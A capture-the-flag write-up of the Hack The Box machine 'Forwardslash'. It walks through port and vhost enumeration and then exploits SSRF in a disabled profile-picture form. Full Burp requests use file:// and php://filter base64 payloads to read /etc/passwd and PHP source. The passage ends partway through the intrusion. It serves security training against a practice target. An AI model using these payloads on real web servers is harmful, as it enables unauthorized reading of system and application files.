# Forwardslash - Hack The Box

![image]({{0xtaylur.github.io}}/assets/forwardslash/card.png)

## Summary
Forwardslash is a hard linux box that starts off with basic enumerations of vhosts, files, and directories. Using burp to perform a Server-Side Request Forgery (SSRF) vulnerability to access a protected dev directory that can only be accessed through localhost. Once I find credentials and get a shell, I exploit a backup program owned by user pain to find more credentials. Finally, I solve a crypto challenge to get root.

### Enumeration

A basic nmap scan shows 2 open ports: 22 for ssh and 80 for HTTP
```
root@kali:~/HTB/forwardslash# nmap -sC -sV -p22,80 forwardslash.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 11:28 EDT
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When I browse the website with it's IP address, it redirected me to`forwardslash.htb`. So I added this domain name to my local host file to use the hostname instead. It seems as the website has been defaced by **The Backslash Gang**. There are no links or html comments that would help me decide what to do next.
![image]({{0xtaylur.github.io}}/assets/forwardslash/webpage.png)

Using gobuster to scan for vhosts give us a hit for`backup.forwardslash.htb`
```
root@kali:~/HTB/forwardslash# gobuster vhost -q -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -u forwardslash.htb
Found: backup.forwardslash.htb (Status:302) [Size: 33]
```

I go to the backup subdomain to be greeted with a login page and a link to create an account.
![image]({{0xtaylur.github.io}}/assets/forwardslash/backup_login.png)
![image]({{0xtaylur.github.io}}/assets/forwardslash/signup.png)

Once I am logged in, I see a dashboard with a couple of options.
![image]({{0xtaylur.github.io}}/assets/forwardslash/dashboard.png)

I'll come back to this dashboard as I see nothing interesting yet.

After running a gobuster on the vhost, I find a`/dev`directory.
```
root@kali:~/HTB/forwardslash# gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -u backup.forwardslash.htb
/dev (Status: 301)
```

If I try to access that page I get a custom 403 error message. My IP address is shown so this could be a hint that it can only be accessed locally.
![image]({{0xtaylur.github.io}}/assets/forwardslash/denied.png)

Going back the dashboard options, I notice the option to change my profile picture has been disabled.
![image]({{0xtaylur.github.io}}/assets/forwardslash/disabled.png)

This is just disabled client-side with the`disabled`HTML tag:
```html
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
```

Using Burp, I can send a POST request to`profilepicture.php`and send it to the repeater tab. After some testing with the URL parameter, I found I was able to use SSRF and read file with it. The first thing I tried was`/etc/passwd`.
![image]({{0xtaylur.github.io}}/assets/forwardslash/burp_etc.png)

From the`/etc/passwd` file, I find two users:`chiv`and`pain`

I remember how`/dev` could not be accessed from my box. By using the http URI handler in the`url` parameter I can send requests that originate from localhost to get around the IP restriction, reaching an API test page. I could not find anything useful out of this so I try to retrieve the PHP source code of`/dev/index.php`.
```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/welcome.php
DNT: 1
Connection: close
Cookie: PHPSESSID=7pqvee5324kd0gkakssmsprjtj
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Content-Length: 16

url=///var/www/backup.forwardslash.htb/dev/index.php
```

This is the response I got:
![image]({{0xtaylur.github.io}}/assets/forwardslash/response.png)

I try to get around this by using a`PHP`wrapper and encoding it in base64.
```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/welcome.php
DNT: 1
Connection: close
Cookie: PHPSESSID=7pqvee5324kd0gkakssmsprjtj
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Content-Length: 101

url=php://filter/convert.base64-encode/resource=file:///var/www/backup.forwardslash.htb/dev/index.php
```

We have a response encoded in base64 come back to us.
![image]({{0xtaylur.github.io}}/assets/forwardslash/base64.png)